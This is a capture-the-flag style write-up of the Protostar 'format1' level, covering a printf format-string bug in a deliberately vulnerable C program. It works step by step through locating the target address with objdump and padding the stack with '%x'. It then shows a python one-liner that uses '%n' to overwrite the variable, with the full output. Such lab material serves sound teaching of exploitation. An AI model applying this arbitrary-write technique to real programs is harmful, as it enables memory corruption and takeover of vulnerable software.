## FORMAT ONE ##
This level shows how format strings can be used to modify arbitrary memory
locations.

Hints

objdump -t is your friend, and your input string lies far up the stack :)
This level is at /opt/protostar/bin/format1

### Source Code ###
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
    printf(string);
    
    if(target) {
        printf("you have modified the target :)\n");
    }
}

int main(int argc, char **argv)
{
    vuln(argv[1]);
}
```

In order to hit the target, we need to find a way to modify the variable
*target*. As suggested by the hints, we can easily find out the *target* address

```bash
objdump -t format1 | grep target

08049638 g     O .bss   00000004              target
```

From the hints, we also know that we can exploit the bug from printf(string)
From the man page, 
"
Because  sprintf()  and  vsprintf()  assume  an  arbitrarily  long string, 
callers must be careful not to overflow the actual space; this is often 
impossible to assure.  Note that the length  of  the strings produced  is  
locale-dependent  and difficult to predict. Use  snprintf()  and  vsnprintf()  
instead  (or asprintf(3) and vasprintf(3)). Code  such  as  printf(foo);  
often indicates a bug, since foo may contain a % character. If foo comes from 
untrusted user input, it may  contain  %n, causing the printf() call to write 
to memory and creating a security hole.
"

That means we can use "%n" to overwrite the value of 0x08049638. 
Besides, if we play around a little bit with format1, we can realize that if we
insert an input containing the format string. That means, it plays as the first
variable on the stack. The other variables are not input will be taken from the
stack and create a leak. 

Therefore, if we tune the input such as we can put the *target* address as the
last variable and the '%n' in the format string, we can change this variable.
```
/opt/protostar/bin/format1 "`python -c "print('AAAA' + '    \x38\x96\x04\x08' +
'%x ' * 134 + '%x ')"`"
AAAA    8804960c bffff628 8048469 b7fd8304 b7fd7ff4 bffff628 8048435 bffff804
b7ff1040 804845b b7fd7ff4 8048450 0 bffff6a8 b7eadc76 2 bffff6d4 bffff6e0
b7fe1848 bffff690 ffffffff b7ffeff4 804824d 1 bffff690 b7ff0626 b7fffab0
b7fe1b28 b7fd7ff4 0 0 bffff6a8 aefcb228 84a8a438 0 0 0 2 8048340 0 b7ff6210
b7eadb9b b7ffeff4 2 8048340 0 8048361 804841c 2 bffff6d4 8048450 8048440
b7ff1040 bffff6cc b7fff8f8 2 bffff7e9 bffff804 0 bffff9a6 bffff9b4 bffff9c8
bffff9ea bffff9fd bffffa07 bffffef7 bfffff35 bfffff49 bfffff58 bfffff69 bfffff71
bfffff81 bfffff8e bfffffc4 0 20 b7fe2414 21 b7fe2000 10 f8bfbff 6 1000 11 64 3
8048034 4 20 5 7 7 b7fe3000 8 0 9 8048340 b 3e9 c 0 d 3e9 e 3e9 17 1 19 bffff7cb
1f bfffffe1 f bffff7db 0 0 0 0 92000000 691fb7a9 d7aba888 30b187bb 69bd2965
363836 0 0 706f2f00 72702f74 736f746f 2f726174 2f6e6962 6d726f66 317461 41414141
20202020 8049638
```
The target address is inserted on the stack as the last variable. Notice that we
put '%x ' as we tune the string in order to put '%n ' without any change. Now
hit the target by changing '%x ' to '%n '.

```
/opt/protostar/bin/format1 "`python -c "print('AAAA' + '    \x38\x96\x04\x08' +
'%x ' * 134 + '%n ')"`"
AAAA    8804960c bffff628 8048469 b7fd8304 b7fd7ff4 bffff628 8048435 bffff804
b7ff1040 804845b b7fd7ff4 8048450 0 bffff6a8 b7eadc76 2 bffff6d4 bffff6e0
b7fe1848 bffff690 ffffffff b7ffeff4 804824d 1 bffff690 b7ff0626 b7fffab0
b7fe1b28 b7fd7ff4 0 0 bffff6a8 fe7ef426 d42ae236 0 0 0 2 8048340 0 b7ff6210
b7eadb9b b7ffeff4 2 8048340 0 8048361 804841c 2 bffff6d4 8048450 8048440
b7ff1040 bffff6cc b7fff8f8 2 bffff7e9 bffff804 0 bffff9a6 bffff9b4 bffff9c8
bffff9ea bffff9fd bffffa07 bffffef7 bfffff35 bfffff49 bfffff58 bfffff69 bfffff71
bfffff81 bfffff8e bfffffc4 0 20 b7fe2414 21 b7fe2000 10 f8bfbff 6 1000 11 64 3
8048034 4 20 5 7 7 b7fe3000 8 0 9 8048340 b 3e9 c 0 d 3e9 e 3e9 17 1 19 bffff7cb
1f bfffffe1 f bffff7db 0 0 0 0 4000000 4ad2ba5a 95ac80c9 4acf5666 69aa6940
363836 0 0 706f2f00 72702f74 736f746f 2f726174 2f6e6962 6d726f66 317461 41414141
20202020  you have modified the target :)

```

